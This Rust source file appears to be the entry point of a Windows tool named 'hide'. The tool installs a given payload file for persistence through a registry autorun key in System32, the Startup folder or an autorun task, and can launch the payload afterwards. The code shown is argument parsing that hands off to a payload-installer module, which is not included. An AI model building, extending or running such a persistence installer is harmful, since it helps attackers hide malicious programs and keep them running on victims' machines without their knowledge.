mod auxiliary;
mod payloadinstaller;

extern crate getopts;

const HIDE_VERSION: &str = "0.1.1";

fn print_usage(program: &str, opts: getopts::Options) {
    println!("hide version {}", HIDE_VERSION);
    let brief = format!("Usage: {} [options]", program);
    print!("{}", opts.usage(&brief));
}

#[cfg(not(target_os = "windows"))]
fn main() {
    panic!("This program is only for Windows");
}

#[cfg(target_os = "windows")]
fn main() {
    //Read program arguments using getopts crate

    let args: Vec<String> = std::env::args().collect();
    let program = args[0].clone();
    let mut opts = getopts::Options::new();

    //read option to hide the file
    opts.reqopt(
        "o",
        "option",
        "1. Registry autorun (System32 folder), 2. Startup folder, 3. Autorun Task",
        "How to hide a file",
    );

    //read required file name
    opts.reqopt("f", "file", "File to hide", "payload file name");

    opts.optflag("r", "run", "Runs the payload after installing it");

    let matches = match opts.parse(&args[1..]) {
        Ok(m) => m,
        Err(f) => {
            println!("{}", f);
            print_usage(&program, opts);
            return;
        }
    };

    let hide_option = matches.opt_str("o").unwrap().parse::<u8>().unwrap();
    let file_name = matches.opt_str("f").unwrap();
    let run_prg = matches.opt_present("r");

    let installer = payloadinstaller::PayloadInstaller::new(hide_option, file_name);
    match installer.run(run_prg) {
        Ok(_) => println!("Payload installed successfully"),
        Err(e) => println!("Error: {}", e),
    }
}
